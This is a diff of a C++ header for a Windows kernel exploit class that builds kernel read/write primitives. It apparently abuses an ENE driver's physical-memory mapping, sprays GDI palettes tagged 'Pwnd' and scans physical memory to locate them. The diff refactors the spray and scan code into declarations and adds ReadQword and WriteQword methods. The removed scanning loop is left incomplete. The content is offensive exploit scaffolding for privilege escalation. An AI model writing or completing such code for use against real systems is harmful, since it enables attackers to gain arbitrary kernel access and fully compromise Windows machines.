@@ -1,64 +1,40 @@
 #pragma once
 
-#include <array>
+#include <vector>
 #include <algorithm>
 
 #include "EneDriver.h"
 #include "Palette.h"
 
-constexpr size_t NUMBER_OF_PALETTES = 0x3000;
-constexpr size_t PAGE_SIZE = 0x1000;
-constexpr PALETTEENTRY PALETTE_IDENTIFIER = { 'P', 'w', 'n', 'd' };
-
 /*
 	Implements kernel virtual read/write primitives
 */
 class KernelReadWrite {
+public:
+	KernelReadWrite(const std::string& DriverPath);
+
+	ULONG64 ReadQword(PVOID Address);
+
+	VOID WriteQword(ULONG64 Value, PVOID Address);
+
 private:
 	EneDriver driver;
-	HPALETTE managerPalette;
-	HPALETTE workerPalette;
+	HPALETTE foundPaletteHandle = nullptr;
+	// pointer to physical page containing the palette
+	PALETTE64* foundPaletteAddress = nullptr;
 
 	/*
 		Creates a ton of palettes.
 	*/
-	VOID SprayPalettes(std::array<HPALETTE, NUMBER_OF_PALETTES>& Palettes) {
-		LOGPALETTE palette = { 0 };
-		palette.palVersion = 0x300;
-		palette.palNumEntries = 2;
-		palette.palPalEntry[0] = PALETTE_IDENTIFIER;
+	VOID SprayPalettes(std::vector<HPALETTE>& Palettes);
 
-		for (UINT32 i = 0; i < NUMBER_OF_PALETTES; ++i) {
-			palette.palPalEntry[1] = *reinterpret_cast<PALETTEENTRY*>(&i);
-			Palettes[i] = ::CreatePalette(&palette);
-		}
-	}
+	/*
+		Finds a palette based on physical-memory scanning.
+	*/
+	VOID FindMappedPalette(const std::vector<HPALETTE>& Palettes);
 
-	VOID FindWorkerAndManager() {
-		// step 1: create a ton of palettes
-		std::array<HPALETTE, NUMBER_OF_PALETTES> palettes;
-		this->SprayPalettes(palettes);
-
-		ULONG_PTR currentPhysicalAddress = 0;
-		PBYTE mappedPaged = nullptr;
-		while ((mappedPaged =
-			reinterpret_cast<PBYTE>(this->driver.MapPhysicalMemory(PAGE_SIZE, currentPhysicalAddress))) != nullptr) {
-			
-			for (auto i = 0; i < PAGE_SIZE - sizeof(PALETTEENTRY); ++i) {
-				if (*reinterpret_cast<const UINT32*>(&mappedPaged[i]) == *reinterpret_cast<const UINT32*>(&PALETTE_IDENTIFIER)) {
-				
-				}
-			}
-
-			this->driver.UnmapPhysicalMemory(currentPhysicalAddress);
-			currentPhysicalAddress += PAGE_SIZE;
-		}
-	}
-
-public:
-	KernelReadWrite(const std::string& DriverPath) : driver(DriverPath), managerPalette(0), workerPalette(0) {
-
-	}
-
-
+	/*
+		Frees any unused palettes.
+	*/
+	VOID FreeOtherPalettes(const std::vector<HPALETTE>&& Palettes);
 };
